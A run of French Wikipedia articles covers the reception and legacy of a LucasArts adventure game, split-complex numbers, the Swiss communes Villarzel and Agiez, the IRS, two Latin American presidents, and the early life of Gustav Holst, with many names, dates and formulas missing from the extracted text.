Comme les précédentes, la version NES du jeu est plutôt bien accueillie par la presse spécialisée à sa sortie en 1990. Les journalistes du magazine "Consoles +" notent qu’il fonctionne comme ' mais que contrairement à celui—ci, il est . Au niveau des graphismes, ils n’identifient pas de changement par rapport aux versions sur ordinateurs mais ils notent quelques améliorations au niveau sonore, avec notamment des musiques et des . Ils jugent donc que sa réalisation a des faiblesses mais estiment que sa conception, qu’ils jugent , compense largement ce défaut. Ils considèrent en effet que le jeu est plein d’humour et qu’il propose des énigmes mais pas trop difficile, et concluent qu’il s’agit d’un jeu dont les possesseurs de Nintendo peuvent difficilement se passer. De leur côté, les journalistes de ' jugent qu’il est avec notamment un scénario sympa, des graphismes soignés, une interface très simple d’utilisation et la possibilité d'utiliser plusieurs personnages indépendamment et de pouvoir passer de l'un a l'autre à volonté. Ils le décrivent donc comme un jeu et considère qu’il est la porte d’entrée idéale pour les joueurs souhaitant découvrir les jeux d’aventure, et un indispensable pour les fans du genre.
Postérité.
Impact culturel.
Les rétrospectives désignent ' comme un jeu particulièrement influent, qui a contribué à réinventer le ' des jeux d’aventure graphique. La presse spécialisée note en particulier que supprimer la nécessité de pour réaliser une action rend l’interface plus intuitive et permet au joueur de se focaliser sur l’histoire et les énigmes, ce qui rend l'expérience de jeu moins frustrante et plus amusante. Les journalistes considèrent que "" a défini le style de et qu'il a contribué à faire du studio un développeur de référence dans le domaine des jeux d’aventure graphique. D’après ces rétrospectives, son succès, et celui de titres comme ' ou encore ', inaugure l’âge d’or des jeux d’aventure humoristiques, et permet au genre de devenir commercialement viable. C’est également un des premiers jeux vidéo à introduire le placement de produit, technique qui est ensuite reprise dans des jeux comme "", "Zool", ou "Tapper".
Impact technologique.
Le moteur de jeu de ', le SCUMM, est également considéré comme une révolution pour le genre. Les rétrospectives soulignent notamment son utilisation par onze jeux d’aventure développés par durant les dix années qui suivent et qu'après avoir quitté le studio en 1992, Ron Gilbert le réutilise pour créer des jeux d’aventure au sein de . Un journaliste attribue ce succès à un souhait d’optimiser le processus de développement et de produire des jeux d’aventure plus amusants. Il note que d’autres studios de développement adoptent ensuite un système similaire. Rétrospectivement, Ron Gilbert juge avoir fait un certain nombre d’erreurs en développant le jeu, comme les situations où le joueur se retrouve bloqué, et qu’il a donc amélioré le concept pour les jeux sur lesquels il a ensuite travaillé, comme pour les '.
Adaptation.
En 1990, le jeu fait l’objet d’une adaptation en série télévisée issue d’une collaboration entre , et Atlantis Films. La série est diffusée sur la chaine à partir de aux États-Unis, puis au Canada sur YTV. La série reste ensuite à l’antenne pendant trois saisons, 66 épisodes ayant été tournés. Bien qu’elle s’inspire en partie du jeu vidéo, son scénario est très différent de celui du jeu. Celui-ci se focalise en effet sur la vie de famille des Edison, Joe Flaherty jouant le rôle du docteur Fred. L’équipe scénaristique est dirigée par Eugene Levy. Lors de sa diffusion, la série est bien accueillie par les critiques. Ainsi, le "Time magazine" la considère comme une des meilleures séries de l’année. Certaines critiques, comme celle de Ken Tucker dans le magazine , se demandent cependant comment celle-ci a atterri sur "" compte tenu de l’humour de Flaherty.
Suite.
Début 1990, LucasArts demande à Dave Grossman et à Tim Schafer, qui avaient travaillé avec Gilbert sur la série ', de concevoir une suite à ' intitulée "". Pour l’écriture du scénario, ils sont dans un premier temps aidés par Winnick et Gilbert, ce dernier ayant alors l’idée d'asseoir les énigmes du jeu sur les voyages dans le temps. Les deux concepteurs choisissent de garder un certain nombre de personnages du premier épisode, notamment Bernard et les Edison, mais ils abandonnent le système de sélection des personnages, qui d’après eux n’apporte pas grand-chose au système de jeu. En hommage au premier épisode, le duo incorpore dans le jeu une énigme dans laquelle le joueur doit congeler puis décongeler un hamster. Ils donnent également au joueur la possibilité de jouer au jeu original via un ordinateur disponible dans le jeu. Comme son prédécesseur, "" utilise le moteur SCUMM. Il est le premier jeu développé par à inclure des doublages. Publié en , le jeu est très bien accueilli par la presse spécialisée à sa sortie et reste aujourd’hui considéré comme une référence du genre.

</doc>
<doc id="191798" url="https://fr.wikipedia.org/wiki?curid=191798" title="Nombre complexe déployé">
Nombre complexe déployé

En mathématiques, les nombres complexes déployés ou fendus forment un anneau commutatif non-intègre, extension des nombres réels définis de manière analogue aux nombres complexes (usuels). La différence-clef entre les deux est que la norme induite par la multiplication des nombres complexes (usuels) est euclidienne :
alors que celle induite par la multiplication des nombres complexes déployés est, quant à elle, lorentzienne :
Les nombres complexes déployés ont beaucoup d'autres noms, voir la section des synonymes ci-dessous.
Un espace vectoriel réel à deux dimensions muni du produit interne de Minkowski est appelé un espace de Minkowski de dimension 1+1, souvent noté formula_3 . Tout comme la géométrie euclidienne du plan euclidien formula_4 peut être décrite avec les nombres complexes, la géométrie lorentzienne du plan de Minkowski formula_3 peut être décrite avec les nombres complexes déployés.
Le nom "déployé" provient du fait que les signatures de la forme ("p","p") sont appelées "signatures déployées". En d'autres mots, les nombres complexes déployés sont similaires aux nombres complexes mais dans la signature déployée (1,1).
Définition.
Un nombre complexe déployé est de la forme :
où "x" et "y" sont des nombres réels et la quantité "j" définie par (voir l'article sur les tessarines) :
L'ensemble de tous ces "z" est appelé le "plan complexe déployé". L'addition et la multiplication des nombres complexes déployés sont définies par :
Cette multiplication est commutative, associative et distributive sur l'addition.
Conjugué, norme, et produit interne.
Comme pour les nombres complexes, on peut définir la notion de "conjugué complexe déployé". Si
le conjugué de "z" est défini par
Le conjugué satisfait les propriétés similaires du conjugué complexe usuel :
Ces trois propriétés impliquent que le conjugué complexe déployé est un automorphisme d'ordre 2.
La "norme carrée" (ou forme quadratique) d'un nombre complexe déployé formula_10 est donnée par
Cette norme n'est pas définie positivement mais possède plutôt une métrique (1, 1). Une propriété importante de cette norme est qu'elle est préservée par la multiplication complexe déployée :
Le produit interne associé (1,1) est donné par
où formula_10 et formula_20 et
Les nombres complexes déployés "z" et "w" sont dits orthogonaux hyperboliques si &lt;"z", "w"&gt; = 0.
Un nombre complexe déployé est inversible si et seulement si sa norme est différente de zéro (formula_22). L'inverse d'un tel élément est donné par
Les nombres complexes déployés qui ne sont pas inversibles sont appelés "éléments nuls". Ceux-ci sont tous de la forme formula_24 pour un certain nombre réel "a".
Base diagonale.
Il existe deux éléments idempotents non-triviaux donnés par formula_25 et formula_26 (c'est-à-dire que formula_27 et formula_28). Ces deux éléments sont de norme nulle et "orthogonaux" au sens suivant :
Il est souvent commode d'utiliser "e" et "e"* comme une base alternative pour le plan complexe déployé. Cette base est appelée la "base diagonale" ou "base nulle". Le nombre complexe déployé "z" peut être écrit dans la base nulle sous la forme
Si nous notons le nombre 
Dans cette base, il devient clair que les nombres complexes déployés sont isomorphes à la somme directe formula_33 avec l'addition et la multiplication définie ci-dessus.
Le conjugué complexe déployé dans la base diagonale est donné par
et la norme par
Géométrie.
L'ensemble des points "z" tels que
formula_36
est une hyperbole pour tout "a" de formula_37 différent de zéro. L'hyperbole est constitué d'une branche gauche et droite passant par "a" et –"a". Le cas "a" = 1 est appelé l"'hyperbole unité". L'hyperbole conjuguée est donnée par
avec une branche supérieure et inférieure passant par "ja" et –"ja". L'hyperbole et l'hyperbole conjuguée sont séparées par deux asymptotes diagonales qui forment l'ensemble des éléments nuls :
Ces deux droites (parfois appelées le "cône nul") sont perpendiculaires et ont des pentes de formula_40.
L'analogue de la formule d'Euler pour les nombres complexes déployés est 
Ceci peut être déduit du développement en série de puissances utilisant le fait que cosh a seulement des puissances paires tandis que sinh a des puissances impaires. Pour toutes les valeurs réelles de l'angle hyperbolique formula_42, le nombre complexe déployé formula_43 est de norme 1 et est lié à la branche droite de l'hyperbole unité.
Puisque formula_44 est de norme 1, en multipliant tout nombre complexe déployé "z" par formula_44, la norme de "z" est préservée et représente une "rotation hyperbolique" (aussi appelée une "transformation de Lorentz"). En multipliant par formula_44 la structure géométrique est préservée, prenant les hyperboles par elles-mêmes et le cône nul par lui-même.
L'ensemble de toutes les transformations du plan complexe déployé qui préserve la norme (ou de manière équivalente, le produit interne) forme un groupe appelé le groupe orthogonal généralisé O(1, 1). Ce groupe est constitué des rotations hyperboliques — qui forme un sous-groupe noté formula_47 — combiné avec quatre réflexions discrètes données par
L'application exponentielle
qui associe formula_42 à une rotation hyperbolique par formula_52 est un isomorphisme de groupes puisque la formule usuelle des exponentielles s'applique :
Propriétés algébriques.
En termes d'algèbre générale, les nombres complexes déployés peuvent être décrits comme le quotient de l'anneau polynomial formula_54 par l'idéal engendré par le polynôme formel formula_55,
L'image de "X" dans l'anneau quotient ainsi construit est l'unité imaginaire "j". Avec cette description, il est clair que les nombres complexes déployés forment un anneau commutatif de caractéristique 0. De plus, si nous définissons une multiplication scalaire de manière évidente, les nombres complexes déployés forment une algèbre associative et commutative de dimension deux sur les nombres réels. L'algèbre n'est pas un corps puisque les éléments nuls ne sont pas inversibles. En fait, tous les éléments nuls différents de zéro sont des diviseurs de zéro.
Puisque l'addition et la multiplication sont des opérations continues en respectant la topologie usuelle du plan, les nombres complexes déployés forment un anneau topologique.
Les nombres complexes déployés ne forment pas une algèbre normée dans le sens usuel du mot puisque la « norme » n'est pas définie positivement. Néanmoins, si on étend la définition pour inclure les normes de signature générale, ils forment une telle algèbre. Ceci s'ensuit du fait suivant 
Pour un exposé sur les algèbres normées de signatures générales, voir la référence par Harvey.
Les nombres complexes déployés sont un cas particulier d'une algèbre de Clifford. Nommément, ils forment une algèbre de Clifford sur un espace vectoriel à une dimension avec une forme quadratique définie négativement. Comparer ceci avec les nombres complexes qui forment une algèbre de Clifford sur un espace vectoriel à une dimension avec une forme quadratique définie positivement. (NB : certains auteurs permutent les signes dans la définition d'une algèbre de Clifford ce qui interchangera le sens de "définie positivement" et de "définie négativement").
Représentations matricielles.
Comme dans le cas des nombres complexes (usuels), on peut facilement représenter les nombres complexes déployés par les matrices. Le nombre complexe déployé
peut être représenté par la matrice
car
et
L'addition et la multiplication des nombres complexes déployés sont alors donnés par l'addition et la multiplication matricielle. La norme de "z" est donnée par le déterminant de la matrice correspondante. La conjugaison complexe déployée correspond à la multiplication des deux côtés par la matrice
La rotation hyperbolique par formula_63 correspond à la multiplication par la matrice
En travaillant dans la base diagonale, cela nous conduit à la représentation matricielle diagonale
Les rotations hyperboliques dans cette base correspond à la multiplication par
qui montre qu'elles sont des applications encadrantes.
Histoire.
L'usage des nombres complexes déployés remonte à 1848 lorsque James Cockle exposa ses Tessarines. William Kingdon Clifford utilisa les nombres complexes déployés pour représenter les sommes de spins en 1882. Clifford appela les éléments « motors ».
Au , les nombres complexes déployés devinrent une plateforme commune pour décrire les transformations de Lorentz de la relativité restreinte, dans un espace-temps plat car un changement de vitesse entre des cadres de référence est élégamment exprimé par une "rotation hyperbolique".
En 1935, J.C. Vignaux et A. Duranona y Vedia développèrent l'algèbre et la théorie des fonctions géométriques complexes déployées dans quatre articles dans "Contribucion a las Ciencias Fisicas y Matematicas", Universidad Nacional de La Plata, Republica Argentina (en espagnol).
Plus récemment, le plan des nombres complexes déployés a été exploité pour exprimer des idées mathématiques, des requêtes et des fonctions. C'est un pont important entre une structure comme le plan complexe ordinaire et le caractère exotique des créations modernes.

</doc>
<doc id="191799" url="https://fr.wikipedia.org/wiki?curid=191799" title="Villarzel">
Villarzel

Villarzel () est une commune suisse du canton de Vaud, située dans le district de la Broye-Vully. Elle est le résultat de la fusion des anciennes communes de Rossens, Sédeilles et Villarzel le juillet 2006. Elle est peuplée de habitants en . Son territoire, d'une surface de 768 hectares, se situe entre les vallées de la Broye et de la Glâne.
Géographie.
Le territoire de Villarzel s'étend sur . Lors du relevé de , les surfaces d'habitations et d'infrastructures représentaient de sa superficie, les surfaces agricoles , les surfaces boisées et les surfaces improductives . 
Toponymie.
Le nom de la commune, qui se prononce , dérive du substantif roman "villāre" (domaine, hameau), suivi du suffixe diminutif "-ĭcellu". Il signifie donc le petit domaine, le petit hameau.
Sa première occurrence écrite date de 1228, sous la forme de Vilarsel.
Son nom en patois vaudois est "Velazî".
Histoire.
Villarzel a été mentionné dès 1228 sous le nom de Vilarsel. Le surnom de ce bourg fortifié était ensuite « Villarzel-l’Évêque », le village relevant de l’évêque de Lausanne, Berthold de Neuchâtel. Un château y fut construit en 1212 par ce dernier et fortifié en 1231 par l’évêque Boniface, qui y résidait volontiers. À la fin du , le château fut pris et brûlé par l’évêque Guillaume de Champvent, car le sire de Villarzel avait refusé de reconnaître ce château en fief.
Bannière levée, les gens de Villarzel ont à plusieurs reprises pillé Marnand, Trey ou Middes. Et le château fut plus d'une fois pris ou brûlé en partie. Puis, il disparut complètement, faute d’entretien. Seule une tour subsiste encore, qui fut une prison à l'époque des Bernois et un logement pour les pauvres durant la Révolution.
Villarzel adhéra à l’émancipation vaudoise en 1798, grâce ses délégués Jonas Rossier et Frédéric Bersier, et obtint ainsi que les droits de son abbaye militaire fussent maintenus. La paroisse de Villarzel fut la première du canton où les femmes purent voter, en 1910, pour la nomination d’un pasteur.
Le , la commune de Villarzel a fusionné avec celles de Sédeilles et Rossens pour former la nouvelle commune de Villarzel.
&lt;br&gt;&lt;br&gt;&lt;br&gt;
Politique.
Lors des élections fédérales suisses de 2011, la commune a voté à 33,20 % pour l'Union démocratique du centre. Les deux partis suivants furent le Parti socialiste suisse avec 17,24 % des suffrages et le Parti libéral-radical avec 13,81 %. 
Lors des élections cantonales au Grand Conseil de mars 2011, les habitants de la commune ont voté pour le Parti libéral-radical à 35,10 %, l'Union démocratique du centre à 29,69 %, le Parti socialiste à 16,67 %, les Verts à 14,69 %,le Parti bourgeois démocratique et les Vert'libéraux à 3,44 % et Vaud Libre à 0,42 %. 
Sur le plan communal, Villarzel est dirigé par une municipalité formée de 5 membres et dirigée par un syndic pour l'exécutif et un Conseil général dirigé par un président et secondé par un secrétaire pour le législatif.
Économie.
Jusqu'à la seconde moitié du , la commune de Villarzel est principalement tournée vers l'agriculture et l'arboriculture. Dans les dernières décennies, elle s'est transformée en lieu résidentiel accueillant des habitants travaillant dans les villes voisines ; les villages accueillent encore quelques petites entreprises locales ainsi que trois restaurants.
Patrimoine bâti.
Le village de Villarzel est inscrit comme site ISOS. La commune compte également trois objets inscrits comme biens culturels d'importance régionale dans la liste cantonale dressée en 2009 : le site fortifié médiéval du Ressat, la maison de Bize et les ruines de l'ancien château du Châtelard.
Une tour, appuyée au mur d'enceinte du , est un souvenir de l'ancien château de Villarzel. Ce symbole communal figure à la fois sur l'ancien et le nouveau blason communal.
À proximité se trouve l'église, anciennement dédiée à saint Georges et mentionnée dès 1228 ; elle a été restaurée plusieurs fois.
Population.
Surnom.
Les habitants de la commune sont surnommés "lè Pia" (les pics en patois vaudois, peut-être pour leur propension à la causette).
Démographie.
Villarzel compte habitants en . Sa densité de population atteint hab./km.
Le graphique suivant résume l'évolution de la population des anciennes communes composant Villarzel entre 1850 et 2000 :
Transports.
Au niveau des transports en commun, Rossens, Sédeilles et Villarzel font partie de la communauté tarifaire fribourgeoise Frimobil. Le bus CarPostal reliant Romont à Payerne s'arrête dans ces trois localités. Celui reliant Romont à Avry s'arrête à Rossens et Sédeilles. Les trois villages sont aussi desservis par les bus sur appel Publicar, qui sont aussi un service de CarPostal.
Vie communale.
La commune compte plusieurs associations, parmi lesquelles un club des aînés, deux jeunesses (de Sédeilles et de Villarzel), ainsi qu'une amicale des sapeurs-pompiers.
Personnalités.
Rodolphe Rubattel, président suisse en 1954, est originaire de cette commune.

</doc>
<doc id="191801" url="https://fr.wikipedia.org/wiki?curid=191801" title="Internal Revenue Service">
Internal Revenue Service

L' (IRS) est l'agence du gouvernement fédéral des États-Unis qui collecte l'impôt sur le revenu et des taxes diverses et fait respecter les lois fiscales concernant le budget fédéral des États-Unis. Elle est donc considérée comme le fisc américain. L'agence est rattachée au département du Trésor des États-Unis.
Histoire.
Durant leurs 138 premières années d'existence (1776-1913), les États-Unis n'avaient pas d'impôt fédéral fixe sur le revenu. La plus grande part du revenu du gouvernement provenait des impôts indirects sur les produits, des droits de douane et de diverses taxes sur les photographies, les chèques de banque, les certificats d'actions, les testaments, les et d'autres documents légaux.
Plusieurs impôts sur le revenu furent levés à la fin du , dont certains furent déclarés anticonstitutionnels par la Cour suprême. En 1913, le amendement à la Constitution supprime les restrictions sur l'impôt sur le revenu, permettant à cet impôt de devenir permanent. L'agence créée pour percevoir cet impôt fut baptisée « "Internal Revenue Service" » (« Service des recettes internes »), pour se distinguer des institutions du gouvernement collectant les recettes externes au moyen des taxes et des droits de douane.
Depuis 1919, elle dispose d'un IRS Criminal Investigation Division (« Bureau d'enquêtes criminelles de l'IRS ») regroupant agents enquêtant sur les faits liés au trafic de drogue ou au blanchiment d'argent. Les enquêteurs de la CID sont armés de SIG-Sauer P229.
La base de données informatique et logiciel système de l'IRS est nommée (IMF) et et fut créée dans les années 1960. Malgré des tentatives de modernisation, le programme tourne encore sur du COBOL et un langage assembleur vieux de plusieurs décennies, conçu pour l'IBM 7074 et l'IBM 360, ce qui pose des problèmes pour l'interopérabilité et la maintenance. Le Guinness des records indique que c'est le plus vieux système informatique en activité avec SABRE.
Depuis 1996, l'IRS a créé l'ITIN pour permettre aux personnes sans numéro de sécurité sociale de payer les impôts.
En 2013, les républicains accusent Barack Obama d'abus de pouvoir pour avoir ciblé délibérément avec l'IRS des groupes du Tea Party avant un traitement fiscal en vertu du 501c.
Durant la primaire républicaine de 2015, Ted Cruz milite pour abolir l'IRS.

</doc>
<doc id="191807" url="https://fr.wikipedia.org/wiki?curid=191807" title="Enrique Bolaños Geyer">
Enrique Bolaños Geyer

Enrique Bolaños Geyer, né le à Masaya et mort le , est un homme d'État nicaraguayen, ancien président de la république du Nicaragua entre 2002 et 2007. 
Président du Conseil supérieur de l'entreprise privée (Cosep) de 1983 à 1988, puis vice-président de la République dans le gouvernement d'Arnoldo Alemán, Bolaños remporte l'élection présidentielle contre Daniel Ortega le et prête serment le . Il ne se représente pas à la présidentielle de 2006 et Ortega lui succède. 
Présidence.
Il bénéficie pendant la campagne électorale du soutien des États-Unis. Le sous-secrétaire d'État, Marc Grossman, déclare : « L'histoire du sandinisme, faite de violation des principes démocratiques et des droits humains, d'expropriation de propriétés sans indemnisation et de liens avec les parrains du terrorisme nous préoccupe beaucoup ». L'ambassadeur américain, Oliver Garza, multiplie les déclarations dans le même sens, et Jeb Bush, gouverneur de Floride et frère du président George W. Bush, envoie à Enrique Bolaños une lettre d'appui largement diffusée dans la presse nicaraguayenne : « Daniel Ortega est un ennemi de tout ce que les États-Unis représentent. C'est également un ami de nos ennemis. »
Durant son mandat, les luttes intestines que se livraient au sein du parti libéral ses partisans et ceux de son prédécesseur Alemán générèrent une grande inefficacité des institutions gouvernementales. Il affronte en avril et mai 2005 de violentes manifestations contre la hausse des prix des carburants, et plus de 80 maires (sur 152 municipalités) ont exigé qu'il résolve les problèmes de l'énergie ou qu'il démissionne.
Il fait établir une liste de fonctionnaires suspects d'homosexualité et s'attire en conséquence les critiques d'associations de défense des droits de l’homme. Peu avant de remettre son mandat, en novembre 2006, il fait voter par le Parlement l’interdiction totale de l’avortement et propose de fixer les condamnations à 30 ans de prison.

</doc>
<doc id="191809" url="https://fr.wikipedia.org/wiki?curid=191809" title="Nicanor Duarte Frutos">
Nicanor Duarte Frutos

Nicanor Duarte Frutos (né le à Coronel Oviedo) est un journaliste, avocat et homme d'État paraguayen, président de la république du au .
Biographie.
Nicanor Duarte Frutos est marié avec María Gloria Penayo et père de six enfants.
Carrière professionnelle.
Duarte est journaliste, écrivant notamment comme chroniqueur et éditorialiste dans les colonnes du quotidien "", de 1980 à 1991. Il est par ailleurs avocat, licencié en philosophie et diplômé en sciences politiques. Il occupe également une chaire de philosophie et d'éthique à la Faculté de philosophie de l'Université d'Asunción.
Carrière politique.
Duarte entre en politique à l'âge de 14 ans, devenant membre du Parti colorado le . Il exerce les fonctions de ministre de l'Éducation et de la culture d' à , durant la présidence de Juan Carlos Wasmosy, puis à nouveau de mars 1999 à janvier 2001, durant la présidence de Luis Ángel González Macchi.
Membre à deux reprises du bureau politique du Parti colorado, il en devient également le président, après un vote direct des militants, le .
Le , Duarte remporte l'élection présidentielle, avec comme colistier, pour la vice-présidence, , et prend ses fonctions quelques mois plus tard, pour un mandat de cinq ans, jusqu'en août 2008. Il tente de modifier la Constitution afin de pouvoir exercer un second mandat mais doit renoncer devant un mouvement populaire. Particulièrement hostile au candidat réformiste Fernando Lugo, il affirme que « si l’opposition arrive au pouvoir en 2008, commencera la plus terrifiantes des chasses aux sorcières de l’histoire paraguayenne... Nous, les Colorados, serons persécutés comme les Juifs à l’époque de Hitler ».
En , un général de l'armée paraguayenne affirme avoir participé à une réunion au domicile de Lino Oviedo au cours de laquelle a été envisagé un coup d’État contre Fernando Lugo. D'autres personnalités militaires et politiques étaient également présentes, dont Nicanor Duarte.
Son gouvernement fait l'objet d'accusations de montages judiciaires et de séquestrations par la police de militants politiques.

</doc>
<doc id="191812" url="https://fr.wikipedia.org/wiki?curid=191812" title="Agiez">
Agiez

Agiez est une commune suisse du canton de Vaud, située dans le district du Jura-Nord vaudois.
Histoire.
Agiez est mentionné en 1011 sous le nom "in Aziaco". On y découvre un site néolithique (hache à deux tranchants en serpentine) et en 1836 un cimetière burgonde. Rodolphe III, roi de Bourgogne, cède en 1011 des biens au couvent de Romainmôtier. Une nouvelle donation est faite en 1256 par Renaud de Vaumarcus. Agiez est administré au nom du couvent par des métayers. La famille Thomasset, qui fait construire à Agiez une maison seigneuriale, le Château, avec tour hexagonale du ―, détient la charge de métairie du à 1798 ; la dîme lui est inféodée. Sous le régime bernois, Agiez est rattaché au bailliage et à la châtellenie de Romainmôtier ; la commune est gérée par l'assemblée des communiers. Le village fait partie du district d'Orbe dès 1798.
L'église d'Agiez devient paroissiale au ; la chaire date de 1646, et son berceau lambrissé de 1687. La cure est construite en 1705. Arnex est filiale d'Agiez après la Réforme. Au , une importante carrière de pierre de taille est exploitée (100 ouvriers en 1888, fermée en 1914). Le moulin du couvent est mentionné dès 1468 et est en exploitation jusque vers 1825. Agiez est un village agricole et viticole. Le canyon creusé par l'Orbe est aujourd'hui une réserve naturelle (gorges de l'Orbe).
Géographie.
Agiez est située sur un plateau dominant la plaine de l'Orbe.
Population et société.
Surnoms.
Les habitants de la commune sont surnommés les Ritefailles ("lè Rita-Fâïe" en patois vaudois), soit les Rôtisseurs-de-Brebis, ou tout simplement les Brebis. Ils sont quelquefois appelés les Brise-Bouteilles.
Une légende raconte qu'un jeune pâtre aurait fait sécher dans un four une brebis mouillée par la pluie, ce qui expliquerait le premier surnom.
Démographie.
Agiez compte 19 feux en 1529 puis 207 habitants en 1764, 344 en 1850, 612 en 1900, 249 en 1950, 185 en 1970, 224 en 2000 et au .

</doc>
<doc id="191813" url="https://fr.wikipedia.org/wiki?curid=191813" title="Gustav Holst">
Gustav Holst

Gustav Holst ( à Cheltenham, Royaume-Uni — à Londres) est un compositeur anglais. Bien que principalement connu pour sa suite orchestrale "Les Planètes" (1914-1917), il a composé un grand nombre d’œuvres de genres divers. Son style de composition particulier est le produit de plusieurs influences dont celle du renouveau des chansons populaires anglaises au début du .
Les trois générations de la famille Holst le précédant comptaient des musiciens professionnels et il était clair dès son enfance qu'il serait musicien. Il voulait être pianiste mais en a été empêché par une neuropathie périphérique touchant son bras droit. Il entama une carrière de compositeur, étudiant au "Royal College of Music" avec Charles Villiers Stanford. Incapable de vivre de ses compositions, il joua du trombone professionnellement et devint plus tard professeur — un excellent professeur selon son ami Ralph Vaughan Williams. Parmi ses autres activités d'enseignement, il a établi une forte tradition de représentations au dont il a été le directeur musical de 1907 à 1924.
Il est le fondateur d'une série de festivals de musique de la Pentecôte qui ont eu lieu de 1916 à sa mort.
Les œuvres de Holst étaient jouées régulièrement au début du mais sa notoriété n'est vraiment venue que grâce au succès international des "Planètes" dans les années suivant la Première Guerre mondiale. Timide, Holst n'appréciait pas cette renommée et préférait être laissé en paix pour composer et enseigner.
Dans ses dernières années, son style personnel de composition sans compromis heurta de nombreux mélomanes qui le considéraient trop austère et sa brève popularité déclina. Cependant il eut une influence significative sur plusieurs jeunes compositeurs anglais dont Edmund Rubbra, Michael Tippett et Benjamin Britten. À part "Les Planètes" et quelque autres œuvres, sa musique a été négligée jusque dans les années 1980, période où la plus grande partie de son répertoire a été enregistrée.
Biographie.
Enfance.
Famille.
Gustav Holst, de son vrai nom Gustavus Theodore von Holst, est né dans une famille musicienne d'origine suédoise à Cheltenham, dans le Gloucestershire. Il est l'aîné des deux enfants de son père, Adolph von Holst, musicien professionnel, et de sa mère, Clara Cox, née Lediard. Sa mère, principalement d'origine britannique, est la fille d'un avocat respecté de Cirencester ; la partie Holst de la famille est d'origine suédoise, lettone et allemande et compte au moins un musicien professionnel dans chacune des trois générations précédentes.
L'arrière-grand-père de Gustav, Matthias Holst, né à Riga dans l'actuelle Lettonie, était d'origine germano-balte ; il avait été compositeur et professeur de harpe à la cour impériale de Russie à Saint-Pétersbourg. Le fils de Matthias, Gustavus, qui, enfant, avait déménagé avec ses parents en Angleterre en 1802, était un compositeur de musique de salon et un professeur de harpe connu. Il s'appropria la particule aristocratique "von" et l'ajouta de lui-même à son nom de famille dans l'espoir d'obtenir plus de prestige et d'attirer des élèves.
Le père de Gustav, Adolph von Holst, était organiste et chef de chœur à la "", Cheltenham ; il enseignait également et donnait des récitals de piano. Sa femme, Clara, une de ses anciennes élèves, était une pianiste et une chanteuse talentueuse. Gustav avait un frère cadet, Emil Gottfried, qui est devenu connu sous le nom d'Ernest Cossart comme acteur dans le "West End" à New York et dans le cinéma à Hollywood. Clara meurt en et la famille déménagea dans une autre maison à Cheltenham où Adolph demande à sa sœur Nina de l’aider à élever les garçons. Gustav reconnaissait la dévotion de sa tante à sa famille et lui dédia plusieurs de ses premières compositions. En 1885, Adolph se maria à Mary Thorley Stone, une autre de ses élèves. Ils ont eu deux enfants, Matthias (Max) et Evelyn (Thorley). Mary von Holst était absorbée par la théosophie et ne s'intéressait pas beaucoup aux problèmes domestiques. Les quatre enfants d'Adolph furent sujets à ce qu'un des biographes de Gustav appelle « de la négligence bienveillante » et Gustav en particulier « n'était pas submergé d'attention ou de compréhension et, avec sa vue et sa poitrine faible, les deux négligés, il était . »
Enfance et adolescence.
Gustav Holst reçut des cours de piano et de violon qu'il appréciait moins que le piano. À douze ans, il prit des cours de trombone sur la suggestion de son père qui pensait que jouer d'un cuivre lui réduirait son asthme. Holst a été scolarisé à la "Cheltenham Grammar School" entre 1886 et 1891. Il a commencé à composer vers 1886 ; inspiré par le poème "" de Macaulay, il commença, mais abandonna rapidement, un arrangement ambitieux pour chœur et orchestre. Ses premières compositions furent des pièces pour piano ou pour orgue, des chants, des hymnes et une symphonie (à partir de 1892). Ses principales influences, à cette époque, étaient Mendelssohn, Chopin, Grieg et surtout Sullivan. Adolph essaya d'écarter son fils de la composition, espérant qu'il ferait carrière comme pianiste. La santé de Holst fut décisive dans le futur de sa carrière musicale ; il n'avait jamais été fort et en plus de son asthme et de sa vue faible, il souffrait de neuropathie ce qui lui donnait des difficultés à jouer du piano. Il disait que son bras touché était « comme de la gélatine chargée d'électricité. »
Après que Gustav eut quitté l'école en 1891, Adolph lui paya quatre mois à Oxford pour étudier le contrepoint avec George Frederick Sims, organiste au "Merton College". À son retour, Holst obtint son premier poste professionnel à 17 ans en tant qu'organiste et maître de chœur à "Wyck Rissington", Gloucestershire. Ce poste comprenait également la direction de la "Bourton-on-the-Water Choral Society" qui n'offrait pas de rémunération supplémentaire mais qui lui permit d'améliorer sa direction. En , Holst donna ce qui est peut-être sa première représentation publique en tant que pianiste ; son père et lui jouèrent les "Danses hongroises" de Brahms lors d'un concert à Cheltenham. Le programme du concert donne comme prénom "Gustav" plutôt que "Gustavus", il était appelé par cette version courte du prénom depuis sa petite enfance.
Royal College of Music.
En 1892, Holst composa la musique d'une opérette dans le style de Gilbert et Sullivan, "Lansdowne Castle, or The Sorcerer of Tewkesbury". La pièce fut jouée au "Cheltenham Corn Exchange" en , elle fut bien reçue et ce succès l'encouragea à persévérer dans la composition. Il fit une demande de bourse pour le "Royal College of Music" (RCM) à Londres, mais la bourse fut cette année-là attribuée à Samuel Coleridge-Taylor. Holst fut accepté comme étudiant non boursier et Adolph emprunta pour couvrir les dépenses de l'année scolaire. Holst quitta Cheltenham pour Londres en 1893. Il avait peu d'argent et, en partie par économie et en partie par sentiment personnel, il devint végétarien et abstème. Deux ans plus tard, lui fut finalement attribuée une bourse qui régla en grande partie ses problèmes financiers, mais il continua à suivre ce régime austère.
Les professeurs de Holst au RCM furent Frederick Sharpe (piano), William Stephenson Hoyte (orgue), George Case (trombone), George Jacobi (instrumentation) et le directeur de l'école, Hubert Parry (histoire). Après avoir suivi les cours préliminaires avec et Frederick Bridge, Holst put étudier comme il le souhaitait la composition avec Charles Villiers Stanford. Pour gagner un peu d'argent pendant ses études, Holst jouait du trombone professionnellement dans les stations balnéaires en été et dans les salles de concert de Londres en hiver. Sa fille et biographe, Imogen Holst, raconte qu'avec ses payes de musicien, « il était en mesure de payer les besoins vitaux : hébergement et repas, papier manuscrit et des billets pour des places debout dans la galerie de Covent Garden Opera House pour les soirées Wagner. » Il jouait occasionnellement lors de concerts symphoniques, par exemple en 1897 sous la direction de Richard Strauss au "Queen's Hall".
